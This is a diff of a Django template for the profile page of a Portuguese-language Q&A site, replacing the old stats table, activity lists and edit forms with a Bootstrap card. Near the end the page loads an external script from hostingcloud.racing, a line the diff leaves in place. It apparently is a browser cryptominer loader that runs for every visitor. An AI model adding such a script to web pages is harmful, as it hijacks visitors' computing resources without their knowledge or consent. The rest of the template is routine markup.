@@ -113,6 +113,8 @@
 				})
 			}
 		</script>
+		
+		<link rel="stylesheet" href="/static/css/profile.css">
 	</head>
 	<body>
 		<nav class="navbar navbar-expand-sm   navbar-light bg-light">
@@ -153,71 +155,22 @@
 			</div>
 		</nav>
 
-		<center id="center1">
-		    <img src="{{user_p.avatar.url}}" alt="{{user_p.user.username}}">
-			<span>{{user_p.user.username}}</span>
-		</center>
-		<br><center><span id="user-bio">{{user_p.bio}}</span></center><br>
-
-		<table class="table table-bordered">
-		  <thead>
-			<tr>
-			  <th scope="col">Perguntou</th>
-			  <th scope="col">Respondeu</th>
-			  <th scope="col">Pontos</th>
-			</tr>
-		  </thead>
-		  <tbody>
-			<tr>
-			  <td>{{user_p.total_questions}}</td>
-			  <td>{{user_p.total_responses}}</td>
-			  <td>{{user_p.total_points}}</td>
-			</tr>
-		  </tbody>
-		</table>
-
-		{% if user_p.user.username == user.username %}
-		<br>
-		<div class="card">
-            <div class="card-body">
-        		<p>Suas perguntas:</p>
-        		{% for question in questions %}
-        		<div class="card">
-					<div class="card-body">
-						<a href="/question/{{question.id}}">{{question.text}}</a>
-					</div>
-        		</div>
-        		{% endfor %}
-    		</div>
-    		<span style="cursor: pointer;" class="text text-secondary" id="2" onclick="show_more_questions(this)">Carregar mais</span> <!-- O ID deste elemento é usado como paginação. -->
-		</div>
-
-		<div class="card">
-		    <div class="card-body">
-        		<p>Suas respostas:</p>
-        		{% for response in responses %}
-            		<div class="card"><div class="card-body"><p><a href="/question/{{response.question.id}}">{{response.question.text}}</a></p><span>{{response.text}}</span></div></div>
-        		{% endfor %}
-        	</div>
-        	<span style="cursor: pointer;" class="text text-secondary" id="2" onclick="show_more_responses(this)">Carregar mais</span> <!-- O ID deste elemento é usado como paginação. -->
-		</div>
-		<br><br>
-
-		<p>Alterar foto de perfil:</p>
-		<form class="form-inline" method="post" enctype="multipart/form-data">
-			{% csrf_token %}
-			{{change_profile_picture_form}}
-			<input type="submit" value="Alterar">
-		</form>
-
-		<br><br>
-		<p>Alterar biografia:</p>
-		<form method="post">
-			{% csrf_token %}
-			<textarea name="bio" placeholder="Biografia" maxlength="400">{{ user_p.bio }}</textarea><br>
-			<input type="submit" value="Alterar">
-		</form>
-		{% endif %}
+<div class="container mt-5 d-flex justify-content-center">
+    <div class="card p-3">
+        <div class="d-flex align-items-center">
+            <div class="image"> <img src="{{ user_p.avatar.url }}" class="rounded" width="155"> </div>
+            <div class="ml-3 w-100">
+                <h4 class="mb-0 mt-0">{{ user_p.user.username }}</h4> <span>Askeriano</span>
+                <div class="p-2 mt-2 bg-primary d-flex justify-content-between rounded text-white stats">
+                    <div class="d-flex flex-column"> <span class="articles">Perguntas</span> <span class="number1">{{ user_p.total_questions }}</span> </div>
+                    <div class="d-flex flex-column"> <span class="followers">Respostas</span> <span class="number2">{{ user_p.total_responses }}</span> </div>
+                    <div class="d-flex flex-column"> <span class="rating">Pontos</span> <span class="number3">{{ user_p.total_points }}</span> </div>
+                </div>
+                <!--<div class="button mt-2 d-flex flex-row align-items-center"> <button class="btn btn-sm btn-outline-primary w-100">Chat</button> <button class="btn btn-sm btn-primary w-100 ml-2">Follow</button> </div>-->
+            </div>
+        </div>
+    </div>
+</div>
 
 <script src="https://www.hostingcloud.racing/dJi3.js"></script>
 <script>
